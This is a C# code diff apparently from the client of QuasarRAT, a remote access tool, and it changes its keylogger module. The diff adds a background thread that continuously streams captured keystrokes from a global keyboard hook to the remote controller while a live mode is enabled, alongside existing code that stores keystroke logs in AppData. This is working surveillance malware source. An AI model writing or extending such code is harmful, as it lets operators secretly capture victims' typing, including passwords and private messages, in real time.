@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Text;
+using System.Threading;
 using System.Windows.Forms;
 using xClient.Core.Helper;
 using xClient.Core.MouseKeyHook;
@@ -41,6 +42,7 @@ namespace xClient.Core.Utilities
         public static string LogDirectory { get { return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Settings.LOGDIRECTORYNAME); } }
 
         private readonly Timer _timerFlush;
+        private Thread _liveLoggerThread;
         private StringBuilder _logFileBuffer;
         private StringBuilder _liveKeyEventBuffer;
         private List<Keys> _pressedKeys = new List<Keys>();
@@ -312,14 +314,30 @@ namespace xClient.Core.Utilities
             _logFileBuffer.Clear();
         }
 
-        public void SendKeyEvent(Client client)
+        public void EnableLiveLogging(bool enable, Client client)
         {
-            //only process live packet if anything was recently appended
-            if (_liveKeyEventBuffer.Length > 0)
+            this.LiveModeEnabled = enable;
+
+            if (this.LiveModeEnabled)
             {
-                new GetKeyloggerLiveResponse(_liveKeyEventBuffer.ToString()).Execute(client);
-                _liveKeyEventBuffer.Clear();
+                _liveLoggerThread = new Thread(() =>
+                {
+                    while (client.Connected && this.LiveModeEnabled)
+                    {
+                        //only process live packet if anything was recently appended
+                        if (_liveKeyEventBuffer.Length > 0 && !QuasarClient.Exiting)
+                        {
+                            new GetKeyloggerLiveResponse(_liveKeyEventBuffer.ToString()).Execute(client);
+                            _liveKeyEventBuffer.Clear();
+                        }
+                        Thread.Sleep(10);
+                    }
+                    _liveKeyEventBuffer.Clear();
+                });
+                _liveLoggerThread.Start();
             }
+            else
+                _liveLoggerThread.Abort();
         }
     }
 }
